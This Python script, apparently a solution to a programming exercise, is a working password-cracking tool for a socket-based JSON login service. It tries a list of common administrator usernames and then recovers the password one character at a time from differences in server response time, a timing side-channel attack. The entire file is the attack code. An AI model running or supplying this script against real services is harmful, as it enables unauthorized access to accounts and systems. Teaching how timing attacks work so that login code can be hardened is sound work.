# write your code here
import sys
import socket
import datetime
import json

args = sys.argv

with socket.socket() as client_socket:
    hostname = args[1]
    port = int(args[2])

    abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

    logins_list = [
        'admin', 'Admin', 'admin1', 'admin2', 'admin3',
        'user1', 'user2', 'root', 'default', 'new_user',
        'some_user', 'new_admin', 'administrator',
        'Administrator', 'superuser', 'super', 'su', 'alex',
        'suser', 'rootuser', 'adminadmin', 'useruser',
        'superadmin', 'username', 'username1'
    ]

    address = (hostname, port)

    client_socket.connect(address)

    correct_login = ""
    correct_password = ""

    data = {"login": "", "password": ""}
    difference = datetime.timedelta()
    for login in logins_list:
        start = datetime.datetime.now()
        data['login'] = login
        client_socket.send(json.dumps(data).encode())
        response = json.loads(client_socket.recv(1024).decode())
        finish = datetime.datetime.now()
        current_dif = finish - start
        if current_dif > difference:
            difference = current_dif
            correct_login = login

    data['login'] = correct_login
    current_password = ''
    for i in abc:
        correct_char = ''
        difference = datetime.timedelta()
        for a in abc:
            start = datetime.datetime.now()
            data['password'] = current_password + a
            client_socket.send(json.dumps(data).encode())
            response = json.loads(client_socket.recv(1024).decode())
            finish = datetime.datetime.now()
            current_dif = finish - start
            if current_dif > difference:
                difference = current_dif
                correct_char = a

            if response['result'] == 'Connection success!':
                current_password += a
                data['password'] = current_password
                break
        else:
            current_password += correct_char
            continue
        break

    print(json.dumps(data))
    client_socket.close()
